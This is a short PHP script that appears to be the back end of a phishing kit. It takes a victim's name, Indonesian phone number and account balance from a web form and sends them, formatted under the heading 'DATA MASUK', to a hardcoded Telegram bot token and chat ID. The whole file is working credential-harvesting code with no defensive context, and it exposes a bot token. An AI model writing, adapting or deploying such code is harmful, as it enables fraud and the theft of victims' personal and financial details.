<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Access-Control-Allow-Origin: *');
$token = "7658337595:AAEQrQ1skkQMlvvEDMkgQvIG_lTJsnsR_zs";
$chatID = "7933507261";

$name = urldecode($_POST['name']);
$phone = urldecode($_POST['phone']);
$balance = urldecode($_POST['balance']);

$tmpPhone = str_replace("+62", "", $phone);
if (!preg_match('/^\d+$/', $tmpPhone)) {
    return;
}
if (strpos($balance, ".") === false) {
	return;
}
$content = "\nNama:\n".$name."\n\nNo. HP:\n".$phone."\n\nSaldo:\n".$balance."\n";

$newContent = '╭─═══ DATA MASUK ═══─╮\n';
$contentArray = preg_split("/\r\n|\n|\r/", $content);
for ($i=0; $i<sizeof($contentArray); $i++) {
	$contentArrayItem = $contentArray[$i];
	$line = str_pad($contentArrayItem, 21, " ");
	$newContent .= ("╠ ".$line." ╣\n");
}
$newContent .= '╰─══════════════════─╯\n';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"<code>".$newContent."</code>\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
